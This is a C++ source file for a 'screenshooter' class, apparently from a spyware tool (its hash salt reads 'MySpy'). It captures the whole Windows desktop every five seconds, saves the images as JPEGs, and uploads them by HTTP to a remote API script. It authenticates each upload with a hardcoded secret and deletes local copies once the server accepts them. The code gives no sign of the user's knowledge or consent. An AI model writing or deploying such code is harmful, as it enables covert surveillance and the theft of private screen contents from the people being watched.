// Filename: class.screenshooter.cpp
// Author:   Patryk Po³eæ

#include "engine.h"

////////////////////////////////////////////////////////////////////////////////////////////////// Constructor and destructor
C_Screenshooter::C_Screenshooter(C_Base *_objBase): objBase(_objBase)
{
	// Public fields
	stateShooted = 1;

	// Private fields
	fileTempScreen = new C_File;

	hashMD5        = new C_Scrambler;

	curl           = new C_Curl;

	gdiPlusStartupInput = NULL;

	handleDesktopDC = NULL;
	handleBitmapDC = NULL;

	handleBitmap = NULL;

	imageCodecInfo = NULL;

	encodersNum  = 0;
	encodersSize = 0;

	bufferStringStream.str("");

	bufferString.clear();
	pcdDataScreens.clear();

	desktopWidth  = GetSystemMetrics(SM_CXSCREEN);
	desktopHeight = GetSystemMetrics(SM_CYSCREEN);

	screenQuality = -1;
}

C_Screenshooter::~C_Screenshooter()
{
	DeleteObject(handleBitmapDC);
	DeleteObject(handleBitmap);

	::ReleaseDC(0, handleDesktopDC);

	Gdiplus::GdiplusShutdown(gdiPlusToken);
}

////////////////////////////////////////////////////////////////////////////////////////////////// Public methods
void C_Screenshooter::UploadScreens()
{
	DIR *pcdDataScreens;
	pcdDataScreens = opendir(objBase->pcdDataScreens.c_str());

	struct dirent *file;

	string 
		pcfScreen,
		random = hashMD5->Random();

	while(file = readdir(pcdDataScreens)) 
	{
		if(file->d_type == DT_REG)
		{
			pcfScreen = objBase->pcdDataScreens + "\\" + string(file->d_name);
			if(!fileTempScreen->Open(pcfScreen, ios::in | ios::binary)) continue;

			fileTempScreen->GetData(bufferString);
			fileTempScreen->Close();
			
			bufferStringStream.str("");
			bufferStringStream << "path=" << objBase->psdUsersUserDeviceDataScreens << "/" << file->d_name << "&data=" << curl->Escape(bufferString) << "&random=" << random << "&code=" << hashMD5->Hash(random + "Polciu1MySpy", MD5);

			curl->Request(objBase->psfApiSaveScreenPhp, bufferStringStream.str());
			if(curl->GetSourcePage(0, 1) == "1") remove(pcfScreen.c_str());
		}
	}

	closedir(pcdDataScreens);

	bufferStringStream.str("");
	bufferString.clear();

	delete curl;
	delete hashMD5;
	delete fileTempScreen;
}

void C_Screenshooter::InitScreen()
{
	pcdDataScreens = objBase->pcdDataScreens;

	GdiplusStartup(&gdiPlusToken, &gdiPlusStartupInput, NULL);
	handleDesktopDC = ::GetDC(0);
	handleBitmapDC = CreateCompatibleDC(handleDesktopDC);
	handleBitmap = CreateCompatibleBitmap(handleDesktopDC, desktopWidth, desktopHeight);
	SelectObject(handleBitmapDC, handleBitmap);

	EncoderClsid(L"image/jpeg", &clsid);
	
	SetQuality(45);
}

void C_Screenshooter::Shooted()
{
	while(stateShooted)
	{
		BitBlt(handleBitmapDC, 0, 0, desktopWidth, desktopHeight, handleDesktopDC, 0, 0, SRCCOPY);

		Gdiplus::Bitmap bitmap(handleBitmap, NULL);

		bufferStringStream.str("");
		bufferStringStream << pcdDataScreens << "\\" << "screen-" << time(0) << ".jpeg";
		MultiByteToWideChar(CP_ACP, 0, bufferStringStream.str().c_str(), bufferStringStream.str().size() + 1, screenName, 256);
		bitmap.Save(screenName, &clsid, &encoderParameters);

		Sleep(5000);
	}

	_endthread();
}

////////////////////////////////////////////////////////////////////////////////////////////////// Private methods
void C_Screenshooter::EncoderClsid(const WCHAR *_format, CLSID *_clsid)
{
	Gdiplus::GetImageEncodersSize(&encodersNum, &encodersSize);

	imageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(encodersSize));

	GetImageEncoders(encodersNum, encodersSize, imageCodecInfo);

	for(UINT a = 0; a < encodersNum; ++a) if(wcscmp(imageCodecInfo[a].MimeType, _format) == 0) *_clsid = imageCodecInfo[a].Clsid;

	free(imageCodecInfo);
}

void C_Screenshooter::SetQuality(ULONG _screenQuality)
{
	if(screenQuality == -1)
	{
		encoderParameters.Count = 1;
		encoderParameters.Parameter[0].Guid = Gdiplus::EncoderQuality;
		encoderParameters.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
		encoderParameters.Parameter[0].NumberOfValues = 1;
		encoderParameters.Parameter[0].Value = &screenQuality;

		screenQuality = _screenQuality;
	}
	else screenQuality = _screenQuality;
}